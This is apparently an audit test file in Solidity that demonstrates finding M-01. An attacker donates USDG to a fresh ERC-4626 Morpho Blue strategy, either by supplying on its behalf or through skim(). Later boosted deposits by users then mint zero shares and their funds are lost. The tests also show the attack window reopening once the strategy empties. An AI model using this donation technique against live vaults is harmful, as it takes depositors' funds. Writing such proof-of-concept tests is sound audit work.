// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {BaseTest} from "../../BaseTest.sol";
import {IPlanVault} from "../../../src/interfaces/IPlanVault.sol";

/// @dev AUDIT v0.3 / M-01. MorphoBlueStrategy is an OZ ERC-4626 with the default decimals offset (one virtual
///      share) and no zero-share guard, and Morpho Blue lets ANYONE supply on behalf of any address (so does the
///      strategy's own permissionless skim()). While the strategy has no shares outstanding, a donation of D makes
///      every subsequent boosted deposit <= running totalAssets mint ZERO shares: the depositor's USDG is pulled,
///      the plan is credited with internal shares, and its boosted value is 0 forever. The vaults are the only
///      depositors, so the victims are the protocol's own users. Deploy.s.sol does not seed the strategy.
contract Audit3_M01_StrategyDonation is BaseTest {
    address internal attacker = makeAddr("attacker");

    function test_baseline_noDonation_valueIsKept() public {
        uint256 a = _createBoostedPlan(daily, alice, address(nvda), 10e6, 10e6);
        assertApproxEqAbs(_boostValue(daily, a), 10e6, 2);
    }

    function test_donationBeforeFirstDeposit_swallowsEveryBoostedDeposit() public {
        assertEq(strategy.totalSupply(), 0, "strategy is fresh, as after Deploy.s.sol");

        // Donation through Morpho Blue itself: supply on behalf of the strategy, no strategy call needed.
        usdg.mint(attacker, 11e6);
        vm.startPrank(attacker);
        usdg.approve(address(morpho), 11e6);
        morpho.supply(marketParams, 11e6, 0, address(strategy), "");
        vm.stopPrank();
        assertEq(strategy.totalSupply(), 0);
        assertApproxEqAbs(strategy.totalAssets(), 11e6, 1);

        // Alice opens a boosted plan with 10 USDG: the vault deposits, receives 0 strategy shares.
        uint256 a = _createBoostedPlan(daily, alice, address(nvda), 10e6, 10e6);
        assertEq(strategy.balanceOf(address(daily)), 0, "vault holds no strategy shares");
        assertEq(daily.getPlan(a).boostPrincipal, 10e6, "the plan is booked as if funded");
        assertEq(_boostValue(daily, a), 0, "but is worth nothing");

        // The swallowed deposit raised totalAssets to 21, so Bob's 20 USDG is swallowed too (snowball).
        uint256 b = _createBoostedPlan(daily, bob, address(nvda), 10e6, 20e6);
        assertEq(_boostValue(daily, b), 0);

        // Alice cannot get anything back.
        vm.prank(alice);
        vm.expectRevert(IPlanVault.ZeroAmount.selector);
        daily.withdrawIdle(a, type(uint256).max);

        // A later, larger deposit mints the first real shares and works; Alice and Bob stay at zero.
        uint256 c = _createBoostedPlan(daily, carol, address(nvda), 10e6, 1_000e6);
        assertGt(_boostValue(daily, c), 990e6);
        assertEq(_boostValue(daily, a), 0);
        assertLe(_boostValue(daily, b), 1);

        // 30 USDG of user deposits (+ the 11 USDG donation) now belong to the virtual share: unrecoverable.
        uint256 ownedByShares = strategy.convertToAssets(strategy.totalSupply());
        assertGe(strategy.totalAssets() - ownedByShares, 41e6 - 2);
    }

    function test_skimIsAnEquivalentDonationPath() public {
        usdg.mint(attacker, 11e6);
        vm.prank(attacker);
        usdg.transfer(address(strategy), 11e6);
        strategy.skim();
        uint256 a = _createBoostedPlan(daily, alice, address(nvda), 10e6, 10e6);
        assertEq(_boostValue(daily, a), 0);
    }

    /// The window re-opens whenever the strategy's share supply returns to (near) zero, e.g. after every boosted
    /// plan has unboosted: the attack is not only a launch-day concern.
    function test_windowReopensWhenTheStrategyEmpties() public {
        uint256 a = _createBoostedPlan(daily, alice, address(nvda), 10e6, 10e6);
        vm.prank(alice);
        daily.setPlanBoost(a, false); // all shares redeemed; a few wei of dust shares may remain
        uint256 supply = strategy.totalSupply();
        assertLe(supply, 10, "supply is back to dust");

        usdg.mint(attacker, 1_000e6);
        vm.startPrank(attacker);
        usdg.approve(address(morpho), 1_000e6);
        morpho.supply(marketParams, 1_000e6, 0, address(strategy), "");
        vm.stopPrank();

        uint256 b = _createBoostedPlan(daily, bob, address(nvda), 10e6, 50e6);
        assertLe(_boostValue(daily, b), 1, "bob's 50 USDG is gone");
    }
}
